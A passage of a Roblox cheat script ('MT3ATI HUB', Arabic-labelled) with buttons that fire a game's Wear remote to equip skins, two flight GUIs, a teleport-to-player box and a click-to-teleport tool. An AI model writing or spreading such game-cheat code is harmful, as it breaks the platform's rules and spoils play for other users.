game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15294007958
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 11666244695
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن ديك دجاجه", 	Callback = function()
local args = {
            [1] = 13266788937;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "سكن بطه بيضاء", 	Callback = function()
local args = {
            [1] = 12406241223;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "بكن بطه صفراء", 	Callback = function()
local args = {
            [1] = 12406243807;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "سكن بطه سوداء شيطانيه", 	Callback = function()
local args = {
            [1] = 12406246648;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

Tab:AddButton({ 	Name  = "سكن دجاجه مشويه", 	Callback = function()
local args = {
            [1] = 18706155992;
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes",9e9):WaitForChild("Wear",9e9):InvokeServer(unpack(args))
end })

local Tab = Window:MakeTab({"سكربتات من صنعي"})
local Section = Tab:AddSection({
	Name = "جميع السكربتات هنا من صنعي"
})

local Section = Tab:AddSection({
	Name = "سكربت طيران بدون صوت مي"
})

local Button = Tab:AddButton({
  Name = "سكربت طيران",
  Callback = function()
    local flySpeed = 60
local minSpeed = 16
local maxSpeed = 1000

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "FlyControlGui"
ScreenGui.Parent = game:GetService("CoreGui")

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0, 200, 0, 150)
Frame.Position = UDim2.new(0.5, -100, 0.5, -75)
Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Frame.BorderColor3 = Color3.fromRGB(20, 20, 20)
Frame.BorderSizePixel = 2
Frame.Active = true
Frame.Draggable = true
Frame.ClipsDescendants = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Title.BorderSizePixel = 0
Title.Text = "MT3ATI HUB FLY GUI"
Title.TextColor3 = Color3.fromRGB(200, 200, 200)
Title.Font = Enum.Font.Gotham
Title.TextSize = 14
Title.Parent = Frame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 8)
TitleCorner.Parent = Title

local ToggleButton = Instance.new("TextButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Size = UDim2.new(0.9, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.05, 0, 0, 40)
ToggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
ToggleButton.BorderSizePixel = 0
ToggleButton.Text = "تشغيل الطيران"
ToggleButton.TextColor3 = Color3.fromRGB(200, 200, 200)
ToggleButton.Font = Enum.Font.Gotham
ToggleButton.TextSize = 12
ToggleButton.Parent = Frame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 6)
ButtonCorner.Parent = ToggleButton

local SpeedSlider = Instance.new("Frame")
SpeedSlider.Name = "SpeedSlider"
SpeedSlider.Size = UDim2.new(0.9, 0, 0, 50)
SpeedSlider.Position = UDim2.new(0.05, 0, 0, 80)
SpeedSlider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
SpeedSlider.BorderSizePixel = 0
SpeedSlider.Parent = Frame

local SliderCorner = Instance.new("UICorner")
SliderCorner.CornerRadius = UDim.new(0, 6)
SliderCorner.Parent = SpeedSlider

local SpeedText = Instance.new("TextLabel")
SpeedText.Name = "SpeedText"
SpeedText.Size = UDim2.new(1, 0, 0, 20)
SpeedText.Position = UDim2.new(0, 0, 0, 0)
SpeedText.BackgroundTransparency = 1
SpeedText.Text = "السرعه: " .. flySpeed
SpeedText.TextColor3 = Color3.fromRGB(200, 200, 200)
SpeedText.Font = Enum.Font.Gotham
SpeedText.TextSize = 12
SpeedText.Parent = SpeedSlider

local SliderBar = Instance.new("Frame")
SliderBar.Name = "SliderBar"
SliderBar.Size = UDim2.new(0.9, 0, 0, 6)
SliderBar.Position = UDim2.new(0.05, 0, 0, 25)
SliderBar.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
SliderBar.BorderSizePixel = 0
SliderBar.Parent = SpeedSlider

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(0, 3)
BarCorner.Parent = SliderBar

local SliderFill = Instance.new("Frame")
SliderFill.Name = "SliderFill"
SliderFill.Size = UDim2.new((flySpeed - minSpeed) / (maxSpeed - minSpeed), 0, 1, 0)
SliderFill.Position = UDim2.new(0, 0, 0, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBar

local FillCorner = Instance.new("UICorner")
FillCorner.CornerRadius = UDim.new(0, 3)
FillCorner.Parent = SliderFill

local SliderButton = Instance.new("TextButton")
SliderButton.Name = "SliderButton"
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new((flySpeed - minSpeed) / (maxSpeed - minSpeed), -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
SliderButton.BorderSizePixel = 0
SliderButton.Text = ""
SliderButton.Parent = SliderBar

local SliderButtonCorner = Instance.new("UICorner")
SliderButtonCorner.CornerRadius = UDim.new(0, 10)
SliderButtonCorner.Parent = SliderButton

local flying = false
local flyConnection = nil
local plr = game:GetService("Players").LocalPlayer
local rs = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local function disableFlight()
    if flying then
        flying = false
        ToggleButton.Text = "تشغيل الطيران"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        
        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
            plr.Character.Humanoid.PlatformStand = false
            
            local bv = plr.Character.HumanoidRootPart:FindFirstChild("VelocityHandler")
            if bv then
                bv.MaxForce = Vector3.new(0, 0, 0)
                bv:Destroy()
            end
            
            local bg = plr.Character.HumanoidRootPart:FindFirstChild("GyroHandler")
            if bg then
                bg.MaxTorque = Vector3.new(0, 0, 0)
                bg:Destroy()
            end
        end
        
        if flyConnection then
            flyConnection:Disconnect()
            flyConnection = nil
        end
    end
end

local function enableFlight()
    if not flying then
        flying = true
        ToggleButton.Text = "ايقاف الطيران"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        
        local camera = Workspace.CurrentCamera
        local controlModule = require(plr.PlayerScripts:WaitForChild('PlayerModule'):WaitForChild("ControlModule"))
        
        -- Create or update BodyVelocity
        local bv = plr.Character.HumanoidRootPart:FindFirstChild("VelocityHandler") or Instance.new("BodyVelocity")
        bv.Name = "VelocityHandler"
        bv.Parent = plr.Character.HumanoidRootPart
        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        bv.Velocity = Vector3.new(0, 0, 0)
        
        -- Create or update BodyGyro
        local bg = plr.Character.HumanoidRootPart:FindFirstChild("GyroHandler") or Instance.new("BodyGyro")
        bg.Name = "GyroHandler"
        bg.Parent = plr.Character.HumanoidRootPart
        bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        bg.P = 1000
        bg.D = 50
        
        -- Enable flying
        plr.Character.Humanoid.PlatformStand = true
        
        -- Main flying loop
        flyConnection = rs.RenderStepped:Connect(function()
            if not flying or not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid") or 
               not plr.Character.Humanoid.RootPart or plr.Character.Humanoid.Health <= 0 or
               not plr.Character.HumanoidRootPart:FindFirstChild("VelocityHandler") or 
               not plr.Character.HumanoidRootPart:FindFirstChild("GyroHandler") then
                disableFlight()
                return
            end
            
            bg.CFrame = camera.CoordinateFrame
            local direction = controlModule:GetMoveVector()
            bv.Velocity = Vector3.new()
            
            if direction.X ~= 0 then
                bv.Velocity = bv.Velocity + camera.CFrame.RightVector * (direction.X * flySpeed)
            end
            if direction.Z ~= 0 then
                bv.Velocity = bv.Velocity - camera.CFrame.LookVector * (direction.Z * flySpeed)
            end
        end)
    end
end

ToggleButton.MouseButton1Click:Connect(function()
    if flying then
        disableFlight()
    else
        enableFlight()
    end
end)

plr.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid").Died:Connect(function()
        disableFlight()
    end)
end)

local sliding = false

local function updateSlider(input)
    if sliding then
        local sliderAbsolutePosition = SliderBar.AbsolutePosition
        local sliderAbsoluteSize = SliderBar.AbsoluteSize
        
        local touchPosition
        if input.UserInputType == Enum.UserInputType.Touch then
            touchPosition = input.Position
        else
            touchPosition = UserInputService:GetMouseLocation()
        end
        
        local relativeX = (touchPosition.X - sliderAbsolutePosition.X) / sliderAbsoluteSize.X
        relativeX = math.clamp(relativeX, 0, 1)
        
        SliderButton.Position = UDim2.new(relativeX, -10, 0.5, -10)
        SliderFill.Size = UDim2.new(relativeX, 0, 1, 0)
        
        flySpeed = math.floor(minSpeed + (maxSpeed - minSpeed) * relativeX)
        SpeedText.Text = "السرعه: " .. flySpeed
    end
end

SliderButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
        sliding = true
    end
end)

SliderBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        sliding = true
        updateSlider(input)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
        sliding = false
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if sliding and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
        updateSlider(input)
    end
end)
  end
})

local Section = Tab:AddSection({
	Name = "سكربت طيران عادي"
})

local Button = Tab:AddButton({
  Name = "سكربت طيران",
  Callback = function()
    local main = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local up = Instance.new("TextButton")
local down = Instance.new("TextButton")
local onof = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local plus = Instance.new("TextButton")
local speed = Instance.new("TextLabel")
local mine = Instance.new("TextButton")
local closebutton = Instance.new("TextButton")
local mini = Instance.new("TextButton")
local mini2 = Instance.new("TextButton")

main.Name = "main"
main.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
main.ResetOnSpawn = false

Frame.Parent = main
Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(103, 221, 213)
Frame.Position = UDim2.new(0.100320168, 0, 0.379746825, 0)
Frame.Size = UDim2.new(0, 190, 0, 57)

up.Name = "up"
up.Parent = Frame
up.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
up.Size = UDim2.new(0, 44, 0, 28)
up.Font = Enum.Font.SourceSans
up.Text = "ارتفاع"
up.TextColor3 = Color3.fromRGB(0, 0, 0)
up.TextSize = 14.000

down.Name = "down"
down.Parent = Frame
down.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
down.Position = UDim2.new(0, 0, 0.491228074, 0)
down.Size = UDim2.new(0, 44, 0, 28)
down.Font = Enum.Font.SourceSans
down.Text = "انخفاض"
down.TextColor3 = Color3.fromRGB(0, 0, 0)
down.TextSize = 14.000

onof.Name = "onof"
onof.Parent = Frame
onof.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
onof.Position = UDim2.new(0.702823281, 0, 0.491228074, 0)
onof.Size = UDim2.new(0, 56, 0, 28)
onof.Font = Enum.Font.SourceSans
onof.Text = "طيران"
onof.TextColor3 = Color3.fromRGB(0, 0, 0)
onof.TextSize = 14.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.Position = UDim2.new(0.469327301, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 100, 0, 28)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "MT3ATI HUB"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

plus.Name = "plus"
plus.Parent = Frame
plus.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
plus.Position = UDim2.new(0.231578946, 0, 0, 0)
plus.Size = UDim2.new(0, 45, 0, 28)
plus.Font = Enum.Font.SourceSans
plus.Text = "+"
plus.TextColor3 = Color3.fromRGB(0, 0, 0)
plus.TextScaled = true
plus.TextSize = 14.000
plus.TextWrapped = true

speed.Name = "speed"
speed.Parent = Frame
speed.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
speed.Position = UDim2.new(0.468421042, 0, 0.491228074, 0)
speed.Size = UDim2.new(0, 44, 0, 28)
speed.Font = Enum.Font.SourceSans
speed.Text = "1"
speed.TextColor3 = Color3.fromRGB(0, 0, 0)
speed.TextScaled = true
speed.TextSize = 14.000
speed.TextWrapped = true

mine.Name = "mine"
mine.Parent = Frame
mine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
mine.Position = UDim2.new(0.231578946, 0, 0.491228074, 0)
mine.Size = UDim2.new(0, 45, 0, 29)
mine.Font = Enum.Font.SourceSans
mine.Text = "-"
mine.TextColor3 = Color3.fromRGB(0, 0, 0)
mine.TextScaled = true
mine.TextSize = 14.000
mine.TextWrapped = true

closebutton.Name = "Close"
closebutton.Parent = main.Frame
closebutton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closebutton.Font = "SourceSans"
closebutton.Size = UDim2.new(0, 45, 0, 28)
closebutton.Text = "X"
closebutton.TextSize = 30
closebutton.Position =  UDim2.new(0, 0, -1, 27)

mini.Name = "minimize"
mini.Parent = main.Frame
mini.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
mini.Font = "SourceSans"
mini.Size = UDim2.new(0, 45, 0, 28)
mini.Text = "-"
mini.TextSize = 40
mini.Position = UDim2.new(0, 44, -1, 27)

mini2.Name = "minimize2"
mini2.Parent = main.Frame
mini2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
mini2.Font = "SourceSans"
mini2.Size = UDim2.new(0, 45, 0, 28)
mini2.Text = "+"
mini2.TextSize = 40
mini2.Position = UDim2.new(0, 44, -1, 57)
mini2.Visible = false

speeds = 1

local speaker = game:GetService("Players").LocalPlayer

local chr = game.Players.LocalPlayer.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")

nowe = false

game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "MT3ATI HUB";
	Text = "BY MT3ATI";
	Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
Duration = 5;

Frame.Active = true -- main = gui
Frame.Draggable = true

onof.MouseButton1Down:connect(function()

	if nowe == true then
		nowe = false

		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	else 
		nowe = true



		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
		game.Players.LocalPlayer.Character.Animate.Disabled = true
		local Char = game.Players.LocalPlayer.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(0)
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
	end




	if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then



		local plr = game.Players.LocalPlayer
		local torso = plr.Character.Torso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		local bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			game:GetService("RunService").RenderStepped:Wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end
			--	game.Players.LocalPlayer.Character.Animate.Disabled = true
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false




	else
		local plr = game.Players.LocalPlayer
		local UpperTorso = plr.Character.UpperTorso
		local flying = true
		local deb = true
		local ctrl = {f = 0, b = 0, l = 0, r = 0}
		local lastctrl = {f = 0, b = 0, l = 0, r = 0}
		local maxspeed = 50
		local speed = 0


		local bg = Instance.new("BodyGyro", UpperTorso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = UpperTorso.CFrame
		local bv = Instance.new("BodyVelocity", UpperTorso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		if nowe == true then
			plr.Character.Humanoid.PlatformStand = true
		end
		while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
			wait()

			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0,0)
			end

			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		end
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
		game.Players.LocalPlayer.Character.Animate.Disabled = false
		tpwalking = false



	end





end)

local tis

up.MouseButton1Down:connect(function()
	tis = up.MouseEnter:connect(function()
		while tis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,1,0)
		end
	end)
end)

up.MouseLeave:connect(function()
	if tis then
		tis:Disconnect()
		tis = nil
	end
end)

local dis

down.MouseButton1Down:connect(function()
	dis = down.MouseEnter:connect(function()
		while dis do
			wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-1,0)
		end
	end)
end)

down.MouseLeave:connect(function()
	if dis then
		dis:Disconnect()
		dis = nil
	end
end)


game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
	wait(0.7)
	game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
	game.Players.LocalPlayer.Character.Animate.Disabled = false

end)


plus.MouseButton1Down:connect(function()
	speeds = speeds + 1
	speed.Text = speeds
	if nowe == true then


		tpwalking = false
		for i = 1, speeds do
			spawn(function()

				local hb = game:GetService("RunService").Heartbeat	


				tpwalking = true
				local chr = game.Players.LocalPlayer.Character
				local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
				while tpwalking and hb:Wait() and chr and hum and hum.Parent do
					if hum.MoveDirection.Magnitude > 0 then
						chr:TranslateBy(hum.MoveDirection)
					end
				end

			end)
		end
	end
end)
mine.MouseButton1Down:connect(function()
	if speeds == 1 then
		speed.Text = 'cannot be less than 1'
		wait(1)
		speed.Text = speeds
	else
		speeds = speeds - 1
		speed.Text = speeds
		if nowe == true then
			tpwalking = false
			for i = 1, speeds do
				spawn(function()

					local hb = game:GetService("RunService").Heartbeat	


					tpwalking = true
					local chr = game.Players.LocalPlayer.Character
					local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
					while tpwalking and hb:Wait() and chr and hum and hum.Parent do
						if hum.MoveDirection.Magnitude > 0 then
							chr:TranslateBy(hum.MoveDirection)
						end
					end

				end)
			end
		end
	end
end)

closebutton.MouseButton1Click:Connect(function()
	main:Destroy()
end)

mini.MouseButton1Click:Connect(function()
	up.Visible = false
	down.Visible = false
	onof.Visible = false
	plus.Visible = false
	speed.Visible = false
	mine.Visible = false
	mini.Visible = false
	mini2.Visible = true
	main.Frame.BackgroundTransparency = 1
	closebutton.Position =  UDim2.new(0, 0, -1, 57)
end)

mini2.MouseButton1Click:Connect(function()
	up.Visible = true
	down.Visible = true
	onof.Visible = true
	plus.Visible = true
	speed.Visible = true
	mine.Visible = true
	mini.Visible = true
	mini2.Visible = false
	main.Frame.BackgroundTransparency = 0 
	closebutton.Position =  UDim2.new(0, 0, -1, 27)
end)
  end
})

local Section = Tab:AddSection({
	Name = "سكربت انتقال"
})

local Button = Tab:AddButton({
  Name = "سكربت انتقال",
  Callback = function()
    local url = ""
setclipboard(url)
print("Discord url has been copied to your clipboard!")





wait(1.2)
game.StarterGui:SetCore("SendNotification", {
Title = "نرحب بالجميع"; -- the title (ofc)
Text = "MT3ATI HUB"; -- what the text says (ofc)
Icon = ""; -- the image if u want. 
Duration = 5; -- how long the notification should in secounds
})




local gui = Instance.new("ScreenGui")
gui.Name = "قائمه تنقل"
gui.Parent = game.Players.LocalPlayer.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 150, 0, 70)
frame.Position = UDim2.new(0, 10, 0, 10)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 3
frame.BorderColor3 = Color3.new(255, 0, 0)
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local label = Instance.new("TextLabel")
label.Text = "انتقال الى الاعب:"
label.Position = UDim2.new(0, 5, 0, 5)
label.Size = UDim2.new(0, 100, 0, 20)
label.TextColor3 = Color3.new(255, 0, 0)
label.BackgroundTransparency = 1
label.Parent = frame

local textbox = Instance.new("TextBox")
textbox.Position = UDim2.new(0, 5, 0, 25)
textbox.Size = UDim2.new(0, 140, 0, 20)
textbox.Text = ""
textbox.ClearTextOnFocus = true
textbox.Parent = frame

local button = Instance.new("TextButton")
button.Text = "انتقال"
button.Position = UDim2.new(0, 5, 0, 50)
button.Size = UDim2.new(0, 140, 0, 20)
button.Parent = frame

local madeBy = Instance.new("TextLabel")
madeBy.Text = "MT3ATI HUB"
madeBy.Position = UDim2.new(0, 5, 0, 75)
madeBy.Size = UDim2.new(0, 140, 0, 20)
madeBy.TextColor3 = Color3.new(255, 0, 0)
madeBy.BackgroundTransparency = 1
madeBy.Parent = frame

button.MouseButton1Click:Connect(function()
    local targetName = textbox.Text
    for _, player in ipairs(game.Players:GetPlayers()) do
        if string.find(string.lower(player.Name), string.lower(targetName)) then
            game.Players.LocalPlayer.Character:MoveTo(player.Character.Head.Position)
            break
        end
    end
end)
  end
})

local Tab = Window:MakeTab({"سكربتات قويه"})

local Tab = Window:MakeTab({"سكربتات"})

Tab:AddButton({
    Name = "tp tool",
    Callback = function()
        -- tp

mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Equip to Click TP"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
    end
})

